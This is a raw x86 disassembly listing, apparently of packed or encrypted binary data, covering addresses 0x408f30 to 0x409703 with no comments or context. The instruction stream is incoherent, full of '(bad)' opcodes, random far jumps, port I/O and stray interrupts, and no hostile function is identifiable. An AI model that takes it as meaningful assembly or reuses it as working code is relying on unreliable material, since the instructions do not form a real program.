  408f30:	(bad)  
  408f31:	dec    esp
  408f32:	push   cs
  408f33:	cs jb  0x408ebd
  408f36:	dec    ebx
  408f37:	gs mov ah,0x25
  408f3a:	add    DWORD PTR [edi],0x7db6c777
  408f40:	sub    BYTE PTR [ebx],al
  408f42:	add    edx,esi
  408f44:	rcl    DWORD PTR [ebx],0x51
  408f47:	(bad)  
  408f48:	jnp    0x408f42
  408f4a:	mov    edi,0x870990b7
  408f4f:	leave  
  408f50:	push   cs
  408f51:	ficomp WORD PTR [edx]
  408f53:	sub    dh,BYTE PTR [eax]
  408f55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f56:	clc    
  408f57:	sub    DWORD PTR [edi],esp
  408f59:	mov    ds:0x94d08db3,eax
  408f5e:	stos   BYTE PTR es:[edi],al
  408f5f:	enter  0x762c,0x1d
  408f63:	sar    DWORD PTR [ebp-0x33996c14],0x2c
  408f6a:	adc    eax,0xd009cdd4
  408f6f:	sbb    ebx,DWORD PTR [edx+0x81c77e]
  408f75:	sbb    al,0x12
  408f77:	pop    ebx
  408f78:	test   BYTE PTR [ecx],bl
  408f7a:	retf   0x5cc4
  408f7d:	stos   DWORD PTR es:[edi],eax
  408f7e:	jl     0x408f09
  408f80:	lds    esi,FWORD PTR [ebp-0x70f11e3d]
  408f86:	adc    al,0x81
  408f88:	mov    BYTE PTR [eax-0x28],0x30
  408f8c:	lds    eax,FWORD PTR [eax-0x6e]
  408f8f:	dec    ecx
  408f90:	aad    0x2f
  408f92:	pop    ecx
  408f93:	pop    edx
  408f94:	imul   ecx,ecx,0x31
  408f97:	in     al,0x4e
  408f99:	aaa    
  408f9a:	mov    al,ds:0x91c014f6
  408f9f:	xor    edx,DWORD PTR [edx+0x29]
  408fa2:	popa   
  408fa3:	push   eax
  408fa4:	xor    ebx,eax
  408fa6:	enter  0xdae3,0x1e
  408faa:	int3   
  408fab:	push   ebx
  408fac:	cmp    ecx,ecx
  408fae:	mov    ch,0x1f
  408fb0:	ret    
  408fb1:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  408fb3:	mov    BYTE PTR ds:0x3ba3151f,ah
  408fb9:	dec    eax
  408fba:	sbb    BYTE PTR [edx+ebp*8-0x6],cl
  408fbe:	xor    dl,dl
  408fc0:	(bad)  
  408fc1:	mov    bh,BYTE PTR [edi-0x5b]
  408fc4:	ins    BYTE PTR es:[edi],dx
  408fc5:	or     DWORD PTR [ebx+ecx*4+0x24],edi
  408fc9:	pop    esi
  408fca:	call   0x8ea45b9c
  408fcf:	inc    edi
  408fd0:	icebp  
  408fd1:	mov    ebp,0xc429030a
  408fd6:	xchg   ebx,eax
  408fd7:	cmp    al,0x68
  408fd9:	sub    eax,0x75035246
  408fde:	stc    
  408fdf:	xchg   esi,eax
  408fe0:	sar    DWORD PTR [ebx],1
  408fe2:	(bad)  
  408fe3:	js     0x409013
  408fe5:	adc    al,bh
  408fe7:	(bad)  [ebx]
  408fe9:	or     BYTE PTR [eax+esi*2+0x2c],0x79
  408fee:	test   edx,ebx
  408ff0:	aaa    
  408ff1:	fbld   TBYTE PTR [esp+ebp*1-0x20]
  408ff5:	retf   
  408ff6:	inc    esp
  408ff7:	and    esp,eax
  408ff9:	jnp    0x408fcc
  408ffb:	xchg   edx,eax
  408ffc:	cmova  ebp,DWORD PTR [esi-0x3]
  409000:	test   BYTE PTR [esi-0x65576d41],cl
  409006:	(bad)  
  409007:	cs pop ss
  409009:	push   ss
  40900a:	stc    
  40900b:	inc    edi
  40900c:	jbe    0x409081
  40900e:	inc    ecx
  40900f:	jo     0x409043
  409011:	adc    DWORD PTR [edx],0xa9858b22
  409017:	fmul   QWORD PTR [eax]
  409019:	adc    al,0x54
  40901b:	pop    ebx
  40901c:	cs std 
  40901e:	sub    DWORD PTR [eax],ebx
  409020:	test   BYTE PTR [edi+0x40],dl
  409023:	mov    eax,0x799d71c8
  409028:	sbb    al,0x4c
  40902a:	pop    ecx
  40902b:	xchg   edi,eax
  40902c:	push   0x806d8e1e
  409031:	pop    ss
  409032:	fistp  QWORD PTR [ebx-0xd086a29]
  409038:	sbb    DWORD PTR [ecx-0x9],esi
  40903b:	aad    0x27
  40903d:	dec    edi
  40903e:	fs sbb eax,0xacb991f4
  409044:	mov    ss,WORD PTR [esi+0x50]
  409047:	pop    eax
  409048:	fcom   QWORD PTR [edi+0x62977250]
  40904e:	xor    BYTE PTR [ebx+0x4b269e3f],bh
  409054:	mov    ds:0x15b2bfd7,eax
  409059:	inc    edi
  40905a:	popa   
  40905b:	push   ebp
  40905c:	sbb    ecx,edx
  40905e:	icebp  
  40905f:	mov    dh,0x69
  409061:	add    al,BYTE PTR [edx-0x7218361e]
  409067:	out    dx,eax
  409068:	(bad)  
  409069:	hlt    
  40906a:	popa   
  40906b:	mov    eax,0xadef2647
  409070:	in     eax,0xc4
  409072:	push   ecx
  409073:	xor    BYTE PTR [ecx+0x7a58cd00],bl
  409079:	mov    edx,0x156c0760
  40907e:	cmp    DWORD PTR [ebx-0x5c],esi
  409081:	pop    ss
  409082:	data16 ja 0x40900a
  409085:	push   DWORD PTR [ebx+eiz*4]
  409088:	sbb    al,0xb8
  40908a:	jmp    0xe7f3:0x9e91cfaa
  409091:	nop
  409092:	xchg   ebx,eax
  409093:	sub    esi,esi
  409095:	jl     0x4090b4
  409097:	sbb    eax,0xcd36b53d
  40909c:	fsubr  st(0),st
  40909e:	jo     0x4090d7
  4090a0:	pushf  
  4090a1:	xor    BYTE PTR [eax+0x33],ch
  4090a4:	mov    ch,0x63
  4090a6:	push   esi
  4090a7:	(bad)  
  4090a8:	push   esp
  4090a9:	pop    ss
  4090aa:	adc    eax,0x58022f45
  4090af:	inc    esp
  4090b0:	mov    ds:0xf9ec578f,al
  4090b5:	loop   0x4090a6
  4090b7:	jmp    0x409134
  4090b9:	ror    DWORD PTR [ebp-0x731990d6],1
  4090bf:	ins    BYTE PTR es:[edi],dx
  4090c0:	dec    ecx
  4090c1:	daa    
  4090c2:	ret    0xcec
  4090c5:	xor    dh,dl
  4090c7:	jnp    0x40913f
  4090c9:	jg     0x409067
  4090cb:	jmp    0xcfeb:0xb3a257b6
  4090d2:	or     al,0x3f
  4090d4:	test   ecx,0xe76e8d44
  4090da:	and    eax,0x9fbbc91a
  4090df:	and    bl,BYTE PTR [ecx-0x47]
  4090e2:	jmp    0xd9c0:0x27498db1
  4090e9:	sahf   
  4090ea:	fidiv  WORD PTR ds:0xca215014
  4090f0:	mov    al,ds:0x5c2f0ea3
  4090f5:	les    ebx,FWORD PTR [esi]
  4090f7:	ret    
  4090f8:	cmp    edi,DWORD PTR [edx+0x75]
  4090fb:	aam    0xc9
  4090fd:	jnp    0x409087
  4090ff:	out    0x28,al
  409101:	mov    ecx,0x7b51ea76
  409106:	lea    eax,[edx-0x1f19602f]
  40910c:	mov    al,ds:0x4fa6163d
  409111:	mov    bl,0x53
  409113:	pop    ecx
  409114:	inc    esp
  409115:	inc    eax
  409116:	ins    BYTE PTR es:[edi],dx
  409117:	fs push es
  409119:	or     eax,0x525d39b8
  40911e:	(bad)  
  40911f:	dec    esi
  409120:	push   cs
  409121:	push   edx
  409122:	rol    esi,cl
  409124:	sub    DWORD PTR [ebx+0x58f5e6bd],esi
  40912a:	xchg   edx,eax
  40912b:	xchg   edi,eax
  40912c:	pop    ds
  40912d:	test   DWORD PTR [esi+0x26],esi
  409130:	sbb    al,0x30
  409132:	add    eax,0xd1fb7f99
  409137:	lea    ecx,ds:0x2520780b
  40913d:	shr    BYTE PTR [ebx-0x4d0260bf],0xc8
  409144:	sub    al,0xee
  409146:	add    al,0x31
  409148:	mov    esi,0xe434c94
  40914d:	rol    DWORD PTR [edx],0x75
  409150:	(bad)
  409155:	and    eax,0xe9cc3d45
  40915a:	jmp    0x50b3:0xf320abbd
  409161:	inc    ebx
  409162:	cmp    esi,DWORD PTR [ebp-0x66af4ebc]
  409168:	fdivr  DWORD PTR [ecx]
  40916a:	inc    esp
  40916b:	and    al,0x25
  40916d:	in     al,0xfd
  40916f:	mov    ch,0x96
  409171:	gs repz sbb bh,ch
  409175:	dec    edx
  409177:	imul   ebx,DWORD PTR [eax],0x44530eed
  40917d:	sub    eax,0x73e604ea
  409182:	mov    edi,0x4a1b744
  409187:	test   BYTE PTR [edi+edi*4+0x253f949b],ah
  40918e:	sbb    esi,0x71bf1977
  409194:	mov    al,0x83
  409196:	or     eax,0x16007b0a
  40919b:	jnp    0x409183
  40919d:	xchg   ebx,eax
  40919e:	loopne 0x4091cd
  4091a0:	fwait
  4091a1:	inc    esp
  4091a2:	pop    ss
  4091a3:	xchg   esp,eax
  4091a4:	fsub   st,st(6)
  4091a6:	xchg   DWORD PTR [ecx-0x34],edx
  4091a9:	sub    eax,0x3d22ce33
  4091ae:	fstp   QWORD PTR [eax-0x6b]
  4091b1:	dec    esi
  4091b2:	scas   al,BYTE PTR es:[edi]
  4091b3:	out    0xab,eax
  4091b5:	dec    ecx
  4091b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091b7:	call   0xea47:0x3c75c756
  4091be:	jp     0x409221
  4091c0:	and    edx,edi
  4091c2:	add    ebp,DWORD PTR [edi+0x4da5589b]
  4091c8:	add    BYTE PTR [ecx+0x75c70469],ah
  4091ce:	retf   0x8349
  4091d1:	jl     0x40923b
  4091d3:	rcl    ecx,cl
  4091d5:	jl     0x409208
  4091d7:	mov    al,0x20
  4091d9:	dec    ecx
  4091da:	out    0x3a,eax
  4091dc:	popa   
  4091dd:	add    BYTE PTR [edx-0x363f39e7],0x7a
  4091e4:	mov    ecx,DWORD PTR [esi+0x6abe0c0a]
  4091ea:	fidivr DWORD PTR [ebx]
  4091ec:	cmp    eax,0x55ff081d
  4091f1:	out    dx,eax
  4091f2:	inc    eax
  4091f3:	gs and dh,cl
  4091f6:	inc    esi
  4091f7:	inc    esi
  4091f8:	mov    cl,0xf5
  4091fa:	cli    
  4091fb:	mov    dl,0x86
  4091fd:	mov    ds:0xe8c1ab23,eax
  409202:	scas   al,BYTE PTR es:[edi]
  409203:	aaa    
  409204:	pushf  
  409205:	lds    edi,FWORD PTR [ecx+0x3a17e4ec]
  40920b:	sub    DWORD PTR ds:[edi-0x5f996d5c],esi
  409212:	mov    edx,0x4194724c
  409217:	out    0x98,eax
  409219:	jmp    DWORD PTR [ebx]
  40921b:	jp     0x40924a
  40921d:	mov    ds:0x933aaa49,eax
  409222:	in     eax,0x90
  409224:	xor    DWORD PTR [eax],edx
  409226:	push   cs
  409227:	std    
  409228:	mov    al,0x56
  40922a:	xor    al,0x28
  40922c:	lahf   
  40922d:	mov    esp,0x4a32dbe8
  409232:	xlat   BYTE PTR ds:[ebx]
  409233:	add    eax,DWORD PTR [esi-0x496a9329]
  409239:	pop    esi
  40923a:	mov    ds:0xcca5df5c,eax
  40923f:	mov    al,0xd6
  409241:	xchg   DWORD PTR [esi+0x621c36ea],eax
  409247:	mov    ebx,0xd976fbae
  40924c:	pmulhw mm0,QWORD PTR [edi]
  40924f:	mov    edi,DWORD PTR [eax-0x39]
  409252:	hlt    
  409253:	mov    esi,0xe59f04ee
  409258:	stos   DWORD PTR es:[edi],eax
  409259:	push   esp
  40925a:	sub    al,0x3e
  40925c:	fstp   QWORD PTR [eax+0x75]
  40925f:	add    eax,0xdc909f6f
  409264:	lods   al,BYTE PTR ds:[esi]
  409265:	inc    edi
  409266:	mov    WORD PTR [eax-0x259b46f6],fs
  40926c:	dec    ebx
  40926d:	or     al,0xfa
  40926f:	pop    esi
  409270:	cmp    dh,BYTE PTR [esi+0x4b]
  409273:	push   esi
  409274:	test   al,0x97
  409276:	jbe    0x409212
  409278:	add    al,0x4a
  40927a:	inc    esi
  40927b:	ret    0xe100
  40927e:	jge    0x40921f
  409280:	(bad)  
  409281:	cli    
  409282:	in     eax,dx
  409283:	dec    eax
  409284:	jp     0x409236
  409286:	push   edx
  409287:	inc    edi
  409288:	sbb    BYTE PTR [eax],dh
  40928a:	sub    al,0xac
  40928c:	je     0x40929b
  40928e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40928f:	inc    ebp
  409290:	mov    al,0xa
  409292:	(bad)  
  409293:	and    BYTE PTR [ebx-0x1b993fbc],al
  409299:	or     edx,edx
  40929b:	adc    edx,DWORD PTR es:[ecx]
  40929e:	sub    al,0x17
  4092a0:	sbb    DWORD PTR [esi-0x10],edx
  4092a3:	push   eax
  4092a4:	cmc    
  4092a5:	es cmp al,0xef
  4092a8:	add    BYTE PTR [ebx],bl
  4092aa:	push   edx
  4092ab:	cmp    al,0x6d
  4092ad:	pop    esp
  4092ae:	popf   
  4092af:	retf   
  4092b0:	pop    esi
  4092b1:	push   es
  4092b2:	sbb    al,BYTE PTR [ecx+0x72]
  4092b5:	mov    ebx,DWORD PTR [ebx+0x7e]
  4092b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092b9:	ins    DWORD PTR es:[edi],dx
  4092ba:	mov    ds:0x72afb787,al
  4092bf:	fist   WORD PTR [ecx]
  4092c1:	xchg   ecx,eax
  4092c2:	xor    al,0x28
  4092c4:	jae    0x4092f5
  4092c6:	pop    esp
  4092c7:	dec    ecx
  4092c8:	popa   
  4092c9:	cli    
  4092ca:	scas   eax,DWORD PTR es:[edi]
  4092cb:	and    ebp,DWORD PTR [eax-0x4]
  4092ce:	je     0x409346
  4092d0:	push   ebp
  4092d1:	scas   al,BYTE PTR es:[edi]
  4092d2:	dec    ecx
  4092d3:	mov    dl,0x78
  4092d5:	cmc    
  4092d6:	jae    0x40930d
  4092d8:	cmp    DWORD PTR ds:0x4abfc46b,ebp
  4092de:	out    dx,eax
  4092df:	fimul  WORD PTR [eax]
  4092e1:	aad    0xb4
  4092e3:	xchg   esi,eax
  4092e4:	std    
  4092e5:	push   cs
  4092e6:	iret   
  4092e7:	ret    0x6c5b
  4092ea:	push   ebx
  4092eb:	(bad)  
  4092ec:	js     0x409359
  4092ee:	adc    cl,BYTE PTR [esi+0x6f]
  4092f1:	in     al,dx
  4092f2:	(bad)  [edi+0x275faa53]
  4092f8:	es xor ecx,esp
  4092fb:	mov    ebp,0x84e74962
  409300:	test   BYTE PTR [esi+0x6a],bh
  409303:	ficom  DWORD PTR [ecx]
  409305:	(bad)  
  409307:	ja     0x40928c
  409309:	stc    
  40930a:	retf   
  40930b:	inc    edx
  40930c:	cwde   
  40930d:	xlat   BYTE PTR ds:[ebx]
  40930e:	push   ecx
  40930f:	and    al,0x30
  409311:	and    BYTE PTR [esi],dl
  409313:	xor    al,0xe6
  409315:	repz xor BYTE PTR [edi-0x30],al
  409319:	aam    0x2e
  40931b:	ins    BYTE PTR es:[edi],dx
  40931c:	popf   
  40931d:	sub    cl,BYTE PTR [ebx+0x41bf8d68]
  409323:	sar    DWORD PTR [eax-0x47],0xa6
  409327:	stc    
  409328:	jmp    0x3c04ceae
  40932d:	push   ebp
  40932e:	popf   
  40932f:	pop    ebx
  409330:	pop    es
  409331:	fdivr  DWORD PTR [ebp-0x75]
  409334:	and    ch,dh
  409336:	push   0x1
  409338:	lock sti 
  40933a:	int    0xcc
  40933c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40933d:	push   edx
  40933e:	jno    0x4093a3
  409340:	cwde   
  409341:	mov    eax,ds:0x60063f2f
  409346:	gs jno 0x40938a
  409349:	jnp    0x4092cd
  40934b:	cmp    al,0x8c
  40934d:	push   eax
  40934e:	adc    eax,0x4f73b2ef
  409353:	and    esp,eax
  409355:	xor    eax,0x40464d01
  40935a:	retf   0x50be
  40935d:	adc    al,0x96
  40935f:	add    edi,DWORD PTR [edi+0x73]
  409362:	aam    0xb9
  409364:	inc    esi
  409365:	inc    ebx
  409366:	fistp  WORD PTR [edx-0x68]
  409369:	adc    BYTE PTR [eax],dh
  40936b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40936c:	pop    edx
  40936d:	out    0x4d,al
  40936f:	mov    ch,0xbc
  409371:	and    DWORD PTR [edx-0x2a],ebp
  409374:	imul   ecx,DWORD PTR [esp+edx*8+0x6b7634c6],0x29
  40937c:	mov    esi,0x202532d7
  409381:	mov    eax,ds:0x99463c8a
  409386:	push   esi
  409387:	cdq    
  409388:	jnp    0x4093b1
  40938a:	pushf  
  40938b:	jle    0x4093b5
  40938d:	add    eax,0x5fef5c3b
  409392:	add    ch,BYTE PTR [eax-0x7c]
  409395:	pop    ebp
  409396:	push   0x2e
  409398:	ins    BYTE PTR es:[edi],dx
  409399:	xchg   edx,eax
  40939a:	aad    0xfc
  40939c:	fnstcw WORD PTR [esi-0x34]
  40939f:	pop    es
  4093a0:	adc    BYTE PTR ds:0x12b43007,bh
  4093a6:	xor    esp,0xffffff8b
  4093a9:	aaa    
  4093aa:	and    ah,BYTE PTR [edi+0x2d]
  4093ad:	mov    WORD PTR [edi],?
  4093af:	ret    0x26bb
  4093b2:	and    BYTE PTR [eax-0x47abc75b],0x44
  4093b9:	pop    ss
  4093ba:	imul   esp,DWORD PTR [ecx],0x4f95e01c
  4093c0:	mov    DWORD PTR [edx+0x2b8561aa],0xd62548df
  4093ca:	jae    0x4093e2
  4093cc:	add    al,0x5
  4093ce:	inc    ebp
  4093cf:	out    0xee,al
  4093d1:	add    eax,0x5bb97fd2
  4093d6:	ins    DWORD PTR es:[edi],dx
  4093d7:	aas    
  4093d8:	cmp    ebp,0xffffffc0
  4093db:	push   ss
  4093dc:	inc    edx
  4093dd:	mov    bh,0xc5
  4093df:	int    0x97
  4093e1:	xor    BYTE PTR [eax+0x6c6ecdd],al
  4093e7:	pop    edx
  4093e8:	ins    BYTE PTR es:[edi],dx
  4093e9:	inc    ebp
  4093ea:	out    dx,eax
  4093eb:	in     al,dx
  4093ec:	sti    
  4093ed:	mov    ecx,0x41bc56a5
  4093f2:	push   es
  4093f3:	stos   BYTE PTR es:[edi],al
  4093f4:	cmp    eax,0x20cdb452
  4093f9:	xor    dh,BYTE PTR [edx]
  4093fb:	in     al,0x9b
  4093fd:	mul    edi
  4093ff:	add    ebx,ebp
  409401:	sbb    eax,0x9ab19171
  409406:	push   edi
  409407:	xlat   BYTE PTR ds:[ebx]
  409408:	xor    dl,BYTE PTR [edi+0x5a]
  40940b:	shl    bl,cl
  40940d:	ja     0x409422
  40940f:	mov    ah,0x25
  409411:	mov    edx,0xfde971e6
  409416:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409417:	xchg   edx,eax
  409418:	and    DWORD PTR [edi+esi*2+0x4ed876d8],esi
  40941f:	(bad)  
  409420:	mov    dl,0xf2
  409422:	outs   dx,BYTE PTR ds:[esi]
  409423:	fcom   DWORD PTR [ebp+0x453d13af]
  409429:	jle    0x409472
  40942b:	dec    edx
  40942c:	dec    edx
  40942d:	mov    al,ds:0x1e629924
  409432:	jns    0x409468
  409434:	adc    eax,0xb052e556
  409439:	pop    ss
  40943a:	mov    cl,0xbf
  40943c:	pop    es
  40943d:	clc    
  40943e:	jb     0x409438
  409440:	ds in  eax,0x12
  409443:	xchg   esp,eax
  409444:	dec    eax
  409445:	sbb    dl,ah
  409447:	mov    ds:0x103e18b5,eax
  40944c:	cmp    ah,0x17
  40944f:	cwde   
  409450:	addr16 jmp 0xc8fc5b70
  409456:	mov    dl,0x47
  409458:	dec    esp
  409459:	(bad)  
  40945a:	mov    dh,0xe4
  40945c:	mov    edx,0xc2035329
  409461:	cmp    eax,0x6d2bb50f
  409466:	ficomp WORD PTR [ebp-0x30]
  409469:	push   0xf4534eb9
  40946e:	push   ebx
  40946f:	pop    esp
  409470:	jae    0x4094eb
  409472:	aam    0x65
  409474:	cmp    BYTE PTR [edi],dh
  409476:	dec    ebx
  409477:	inc    eax
  409478:	ss jmp 0x40946c
  40947b:	lods   eax,DWORD PTR ds:[esi]
  40947c:	and    esi,edi
  40947e:	clc    
  40947f:	xchg   DWORD PTR [ebx],esp
  409481:	js     0x4094e6
  409483:	jne    0x409461
  409485:	dec    BYTE PTR [esp+edx*8-0x7c]
  409489:	icebp  
  40948a:	in     eax,0x36
  40948c:	mov    cl,0x45
  40948e:	xchg   DWORD PTR [edx],edi
  409490:	sub    al,0xd9
  409492:	imul   esi,DWORD PTR [edx-0x77],0x16
  409496:	test   DWORD PTR [edi],ebp
  409498:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409499:	add    ah,dl
  40949b:	dec    edi
  40949c:	push   edx
  40949d:	or     BYTE PTR cs:[edx+0x478509c],al
  4094a4:	addr16 retf 0xf892
  4094a8:	xchg   esi,eax
  4094a9:	push   es
  4094aa:	cmp    al,0xed
  4094ac:	ins    BYTE PTR es:[edi],dx
  4094ad:	push   esi
  4094ae:	mov    ebp,0x1c00f864
  4094b3:	mov    ecx,0xdf275ac4
  4094b8:	das    
  4094b9:	sbb    DWORD PTR [eax+0x35],esp
  4094bc:	mov    ?,WORD PTR [ebx+0x1241ba24]
  4094c2:	into   
  4094c3:	and    ebx,edi
  4094c5:	js     0x40946a
  4094c7:	push   ebp
  4094c8:	sbb    eax,0x18093798
  4094cd:	sbb    ch,BYTE PTR [ebx-0x58]
  4094d0:	jg     0x4094bf
  4094d2:	push   ebx
  4094d3:	icebp  
  4094d4:	push   ecx
  4094d5:	cli    
  4094d6:	sbb    eax,0x87141293
  4094db:	mov    edx,0x808a9741
  4094e0:	sti    
  4094e1:	retw   
  4094e3:	jp     0x40955e
  4094e5:	cmp    BYTE PTR [ebp-0x7f],bh
  4094e8:	or     al,0x2e
  4094ea:	pop    eax
  4094eb:	jge    0x4094c6
  4094ed:	add    esp,DWORD PTR [esi]
  4094ef:	ficomp DWORD PTR [edx-0x56]
  4094f2:	out    dx,eax
  4094f3:	pop    edi
  4094f4:	imul   edi,DWORD PTR [ebx+0x78204f66],0xffffffce
  4094fb:	xchg   esp,eax
  4094fc:	mov    WORD PTR [ebx-0xe],ds
  4094ff:	mov    dh,0x3c
  409501:	fbstp  TBYTE PTR [esp+edi*1+0x11c695d2]
  409508:	jmp    DWORD PTR [ebx-0xcb86bbc]
  40950e:	in     eax,0xc1
  409510:	fisubr WORD PTR [esi+0x39]
  409513:	scas   al,BYTE PTR es:[edi]
  409514:	dec    ebx
  409515:	bound  ebp,QWORD PTR [ecx+0x6e]
  409518:	shr    dl,1
  40951a:	jbe    0x40949f
  40951c:	popa   
  40951d:	xor    esp,ebp
  40951f:	push   ds
  409520:	or     DWORD PTR [eax+eiz*8],0x74
  409524:	xchg   edx,eax
  409525:	cs cld 
  409527:	loop   0x40957a
  409529:	push   ecx
  40952a:	test   al,0xb1
  40952c:	sbb    al,0x80
  40952e:	adc    DWORD PTR [eax-0x5a7f984e],0x66c58f16
  409538:	push   ds
  409539:	popf   
  40953a:	call   0xd27:0xa5d9
  409540:	push   ebx
  409541:	test   eax,0x9ddff029
  409546:	aad    0x7d
  409548:	test   ebx,eax
  40954a:	adc    BYTE PTR [ecx-0x5e6a652f],cl
  409550:	push   ebp
  409551:	xchg   ebx,eax
  409552:	cld    
  409553:	pop    esi
  409554:	push   ebx
  409555:	add    BYTE PTR [esi+0x2d81ed4d],0x9c
  40955c:	cmp    eax,0x5574dd8c
  409561:	mov    bl,0xd3
  409563:	lods   eax,DWORD PTR ds:[esi]
  409564:	pop    edi
  409565:	pop    eax
  409566:	dec    bx
  409568:	jo     0x409524
  40956a:	xor    al,0xb6
  40956c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40956d:	or     BYTE PTR [ebx],bl
  40956f:	xchg   ecx,eax
  409570:	popf   
  409571:	cmp    dl,BYTE PTR [edx+0x36]
  409574:	dec    eax
  409575:	mov    dh,0xc4
  409577:	into   
  409578:	imul   edx,DWORD PTR [eax-0x75058d6a],0x1
  40957f:	aaa    
  409580:	sub    dl,al
  409582:	cmp    edx,DWORD PTR [ecx]
  409584:	ja     0x4095ed
  409586:	lahf   
  409587:	dec    ebx
  409588:	dec    esp
  409589:	call   ecx
  40958b:	sub    dh,BYTE PTR [edx]
  40958d:	xor    BYTE PTR [edx],0xa8
  409590:	cmp    BYTE PTR ds:[ecx],cl
  409593:	test   eax,0xf8a35588
  409598:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409599:	jno    0x409612
  40959b:	loopne 0x40954d
  40959d:	arpl   WORD PTR [ebx],ax
  40959f:	xchg   ebp,eax
  4095a0:	out    0x75,al
  4095a2:	not    DWORD PTR [eax]
  4095a4:	push   es
  4095a5:	push   0xffffffec
  4095a7:	in     al,0x28
  4095a9:	les    edi,FWORD PTR [ebx-0x50]
  4095ac:	retf   
  4095ad:	inc    eax
  4095ae:	out    0x4f,eax
  4095b0:	imul   edx,esi,0xe6a1ff1c
  4095b6:	mov    ds,WORD PTR [ecx]
  4095b8:	(bad)  
  4095b9:	arpl   WORD PTR [edi-0x73875262],sp
  4095bf:	hlt    
  4095c0:	pop    ebp
  4095c1:	jnp    0x4095ab
  4095c3:	and    DWORD PTR ds:0xd3c76cbe,edi
  4095c9:	arpl   WORD PTR [ebx+eax*2-0x3f],di
  4095cd:	bnd jno 0x40957b
  4095d0:	jecxz  0x4095c0
  4095d2:	ds push es
  4095d4:	sar    DWORD PTR [edi-0x23],cl
  4095d7:	pop    esp
  4095d8:	(bad)  
  4095d9:	and    dh,BYTE PTR [ebx-0x1be839cc]
  4095df:	outs   dx,DWORD PTR ds:[esi]
  4095e0:	pop    esp
  4095e1:	mov    ds:0x940c92e,al
  4095e6:	or     eax,ecx
  4095e8:	xchg   esi,eax
  4095e9:	cdq    
  4095ea:	popf   
  4095eb:	aaa    
  4095ec:	add    eax,0x5bf3b9f6
  4095f1:	jmp    0x8d53:0x9f89cdf9
  4095f8:	int3   
  4095f9:	mov    eax,0x450700ae
  4095fe:	cmp    DWORD PTR ds:0xcc8b7011,esi
  409604:	cmp    al,BYTE PTR [esi+0x28f68df4]
  40960a:	rol    esi,cl
  40960c:	ret    0x26f3
  40960f:	nop
  409610:	fwait
  409611:	lods   eax,DWORD PTR ds:[esi]
  409612:	lea    edi,[ecx-0x71]
  409615:	adc    al,BYTE PTR [esi+0x31]
  409618:	loopne 0x40959d
  40961a:	cmp    BYTE PTR [esi],ch
  40961c:	and    BYTE PTR [ebx-0x23],dh
  40961f:	nop
  409620:	push   edx
  409621:	and    dl,BYTE PTR [eax-0x26aaab9b]
  409627:	add    dl,BYTE PTR [ebx-0x4a]
  40962a:	pop    edi
  40962b:	pop    ss
  40962c:	cmp    DWORD PTR [ebx+0x57],0xde78631f
  409633:	xchg   edx,eax
  409634:	jle    0x409663
  409636:	inc    esp
  409637:	push   ebp
  409638:	mov    bp,0xd282
  40963c:	mov    esp,0xca498c20
  409641:	add    esi,ebp
  409643:	pop    ebp
  409644:	stos   BYTE PTR es:[edi],al
  409645:	lods   al,BYTE PTR ds:[esi]
  409646:	into   
  409647:	mov    ?,WORD PTR [edi]
  409649:	push   edx
  40964a:	cmp    eax,0xa478b89f
  40964f:	fxch   st(2)
  409651:	aam    0xc8
  409653:	sbb    al,0xf3
  409655:	int3   
  409656:	pushf  
  409657:	sbb    eax,DWORD PTR [edx+0x3]
  40965a:	jne    0x4095e8
  40965c:	add    BYTE PTR [eax-0x66],al
  40965f:	test   BYTE PTR [ebx+ebx*1],bl
  409662:	aad    0x27
  409664:	xor    al,0xa2
  409666:	loop   0x4095f1
  409668:	lds    esp,FWORD PTR [esi-0x12]
  40966b:	mov    eax,ds:0x64e35fa2
  409670:	push   ebp
  409671:	mov    cs,WORD PTR [edi]
  409673:	and    eax,0x6f5f1239
  409678:	rcr    esi,cl
  40967a:	or     dl,bh
  40967c:	or     bh,BYTE PTR [ebp+ebp*1+0x3a200ca4]
  409683:	xor    DWORD PTR [ebp+0x481c1cd3],esp
  409689:	mov    ah,0xd6
  40968b:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40968d:	push   ds
  40968e:	repnz stos BYTE PTR es:[edi],al
  409690:	xor    eax,DWORD PTR [eax-0x2b4d729f]
  409696:	das    
  409697:	cdq    
  409698:	aaa    
  409699:	add    eax,0x6fb4ac4b
  40969e:	xchg   ebp,eax
  40969f:	fdivr  st(1),st
  4096a1:	sub    DWORD PTR [edx-0x2dd71459],esp
  4096a7:	mov    eax,ds:0xaed7d04d
  4096ac:	xchg   ebx,eax
  4096ad:	popf   
  4096ae:	inc    ebp
  4096af:	push   0x408e280e
  4096b4:	or     bl,BYTE PTR [ecx]
  4096b6:	jle    0x409674
  4096b8:	outs   dx,BYTE PTR ds:[esi]
  4096b9:	fst    st(3)
  4096bb:	pop    ss
  4096bc:	popf   
  4096bd:	add    BYTE PTR [eax+0x266c3273],dl
  4096c3:	out    dx,eax
  4096c4:	lahf   
  4096c5:	adc    edi,ecx
  4096c7:	test   DWORD PTR [ebp+0x3fbe6276],ebp
  4096cd:	daa    
  4096ce:	mov    dl,0xad
  4096d0:	inc    ebx
  4096d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096d2:	sub    dl,BYTE PTR [eax+0x48210785]
  4096d8:	xlat   BYTE PTR ds:[ebx]
  4096d9:	retf   0x1dc7
  4096dc:	jmp    0xf92990f1
  4096e1:	repnz or edx,ecx
  4096e4:	push   esp
  4096e5:	cdq    
  4096e6:	cmp    al,0x2d
  4096e8:	js     0x40971a
  4096ea:	test   DWORD PTR [ecx-0xf],edi
  4096ed:	sbb    BYTE PTR [edi+0x4dbdd909],al
  4096f3:	inc    esi
  4096f4:	cli    
  4096f5:	mov    al,0x31
  4096f7:	xchg   ebx,eax
  4096f8:	add    al,0x8f
  4096fa:	cs hlt 
  4096fc:	mov    al,ds:0x1b5e6c7
  409701:	jmp    0x4096d0
  409703:	sub    ecx,edi
